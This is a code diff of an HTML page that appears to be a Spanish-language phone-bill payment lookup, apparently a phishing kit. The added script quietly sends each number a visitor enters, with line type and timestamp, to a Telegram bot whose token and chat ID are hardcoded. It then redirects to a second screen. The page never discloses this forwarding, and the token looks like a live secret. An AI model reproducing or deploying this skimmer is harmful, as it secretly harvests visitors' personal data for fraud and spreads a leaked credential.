@@ -164,48 +164,68 @@
     <script src="debtmap.js"></script>
     <script src="scripts.js"></script>
 
-
-<script>
-        // Configura tu bot de Telegram
-       const TELEGRAM_BOT_TOKEN = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo";  // <<-- pon aquí tu token real
+    <script>
+    // 🔹 Configura tu token y chatID de Telegram
+   const TELEGRAM_BOT_TOKEN = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo";  // <<-- pon aquí tu token real
         const TELEGRAM_CHAT_ID = "8217102156";  // <<-- pon aquí tu chat_id real
 
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-            }).catch(err => console.error("Error enviando a Telegram:", err));
+    // Función para enviar mensajes a Telegram
+    function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+        };
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        })
+        .then(res => res.json())
+        .then(data => console.log("✅ Enviado a Telegram", data))
+        .catch(err => console.error("❌ Error enviando a Telegram", err));
+    }
+
+    // Evento al presionar el botón
+    document.getElementById("consultPayButton").addEventListener("click", function () {
+        const lineNumber = document.getElementById("line-number").value.trim();
+
+        if (!lineNumber) {
+            alert("Por favor ingresa un número válido.");
+            return;
         }
 
-        document.getElementById("consultPayButton").addEventListener("click", function () {
-            const lineNumber = document.getElementById("line-number").value.trim();
-            const lineType = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
-            const fecha = new Date().toLocaleString("es-CO", { dateStyle: "short", timeStyle: "medium" });
+        // Loader
+        const loader = document.getElementById("loader");
+        loader.style.display = "flex";
 
-            // Mostrar loader
-            const loader = document.getElementById("loader");
-            loader.style.display = "flex";
+        setTimeout(function () {
+            loader.style.display = "none";
 
-            setTimeout(function () {
-                loader.style.display = "none";
+            // Enviar a Telegram con el formato que pediste 📱
+            const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
+            const fecha = new Date().toLocaleString("es-CO");
 
-                // ✅ Enviar con formato bonito a Telegram
-                if (lineNumber) {
-                    const mensaje = `📱 Nueva consulta de pago:\nTipo: ${lineType}\nNúmero: ${lineNumber}\n⏰ Fecha: ${fecha}`;
-                    sendToTelegram(mensaje);
-                }
+            const mensaje = `📱 *Nueva consulta de pago:*\n` +
+                            `Tipo: ${tipoLinea}\n` +
+                            `Número: ${lineNumber}\n` +
+                            `⏰ Fecha: ${fecha}`;
 
-                // Lógica original de validación y redirección
-                if (window.debtMap && window.debtMap[lineNumber]) {
-                    localStorage.setItem("lineNumber", lineNumber);
-                    window.location.href = "screen2.html";
-                }
-            }, 2000);
-        });
-    </script>
+            sendToTelegram(mensaje);
+
+            // Lógica de redirección original
+            if (window.debtMap && window.debtMap[lineNumber]) {
+                localStorage.setItem("lineNumber", lineNumber);
+                window.location.href = "screen2.html";
+            }
+        }, 2000);
+    });
+</script>
+
 </body>
 </html>
+
 
 
